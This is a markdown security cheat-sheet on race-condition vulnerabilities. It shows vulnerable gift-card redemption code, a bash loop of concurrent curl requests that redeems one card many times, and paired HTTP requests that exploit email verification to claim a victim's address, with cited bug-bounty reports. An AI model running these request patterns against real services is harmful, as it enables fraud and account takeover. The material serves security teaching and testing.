# Race Condition

## Table of Contents

- [Limit Overrun](#limit-overrun)
- [Authentication Bypass](#authentication-bypass)

## Limit Overrun

### The count limit can be bypassed.

- Reusing a gift card multiple times
    1. Redemption logic in the service
        ```python
        card = GiftCard.get(code)

        if not card.redeemed:
            # Concurrent requests all pass this check before any of them marks the card as redeemed
            user.balance += card.amount
            card.redeemed = True
            card.save()
        ```

    2. Requests sent at the same time
        ```bash
        for i in $(seq 1 20); do
            curl -s -X POST https://[VULNERABLE-SERVICE]/giftcard/redeem -H "Cookie: session=[SESSION-ID]" -d "code=[GIFT-CARD-CODE]" &
        done
        wait
        ```
    The card's amount is added once for every request that reached the check before the first one saved its result.

    - HackerOne report, [Race Condition allows to redeem multiple times gift cards which leads to free "money"](https://hackerone.com/reports/759247)

- Receive one-time credits multiple times
    - HackerOne report, [Race Condition in account survey](https://hackerone.com/reports/165570)

## Authentication Bypass

### Authentication can be bypassed.

- Bypassing email-based authentication
    1. Two requests sent at the same time from the attacker's account
        ```http
        POST /profile/email HTTP/1.1
        Host: [VULNERABLE-SERVICE]
        Content-Type: application/x-www-form-urlencoded

        email=attacker@[ATTACKER-DOMAIN]
        ```
        ```http
        POST /profile/email HTTP/1.1
        Host: [VULNERABLE-SERVICE]
        Content-Type: application/x-www-form-urlencoded

        email=[VICTIM-EMAIL]
        ```

    2. Result
        The confirmation email sent to the attacker's address can carry the token generated for the victim's address. Confirming it marks an address the attacker does not own as verified on their account, which services that trust verified email addresses treat as the victim's identity.

    - PortSwigger's research (by albinowax), [Discovering a race condition vulnerability in Gitlab with the single-packet attack](https://www.youtube.com/watch?v=Y0NVIVucQNE)
